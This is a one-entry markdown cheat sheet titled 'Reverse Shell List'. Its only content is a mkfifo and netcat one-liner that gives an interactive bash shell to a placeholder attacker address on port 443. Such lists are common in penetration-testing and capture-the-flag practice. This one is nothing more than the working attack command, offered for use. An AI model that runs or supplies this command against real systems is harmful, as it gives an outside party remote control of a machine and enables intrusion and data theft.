# Reverse Shell List

## Mkfifo Reverse Shell
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc <ATTACKING_IP> 443 >/tmp/f`